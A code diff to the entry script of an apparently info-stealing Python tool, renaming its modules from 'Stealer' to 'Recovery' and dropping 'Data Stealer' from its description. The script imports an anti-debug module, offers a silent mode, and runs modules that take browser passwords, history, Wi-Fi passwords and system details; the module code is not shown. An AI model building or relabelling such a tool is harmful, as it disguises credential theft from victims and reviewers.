@@ -5,13 +5,13 @@ from config import Constant
 from config import Colors
 
 from modules import Antidebug # anti debug
-from modules import ChromiumStealer, WebHistoryStealer, WebBookmarksStealer # browser
-from modules import NetworkInfoStealer, WifiPasswordStealer # network
-from modules import SystemInfoStealer # system
+from modules import ChromiumRecovery, WebHistoryRecovery, WebBookmarksRecovery # browser
+from modules import NetworkInfoRecovery, WifiPasswordRecovery # network
+from modules import SystemInfoRecovery # system
 
 
 def parser():
-    parser = argparse.ArgumentParser(description="Data Stealer | Data Recovery Tool | Built by @hirusha-adi")
+    parser = argparse.ArgumentParser(description="Data Recovery | Built by @hirusha-adi")
     parser.add_argument("--silent", "-s" , action="store_true", help="Silent Mode - No Console Output", default=False)
     parser.add_argument("--verbose", "-v" , action="store_true", help="Verbose - Display everything that happens", default=True)
     parser.add_argument("--log", "-l" , action="store_true", help="Log to file", default=True)
@@ -120,22 +120,22 @@ def main():
         cexit()
     else:
         if Constant.Args.browser_passwords:
-            ChromiumStealer().run()
+            ChromiumRecovery().run()
         
         if Constant.Args.browser_history:
-            WebHistoryStealer().run()
+            WebHistoryRecovery().run()
         
         if Constant.Args.browser_bookmakrs:
-            WebBookmarksStealer().run()
+            WebBookmarksRecovery().run()
         
         if Constant.Args.network_wifi:
-            WifiPasswordStealer().run()
+            WifiPasswordRecovery().run()
         
         if Constant.Args.network_info:
-            NetworkInfoStealer().run()
+            NetworkInfoRecovery().run()
         
         if Constant.Args.system_all:
-            SystemInfoStealer().run()
+            SystemInfoRecovery().run()
         
         cexit()
 
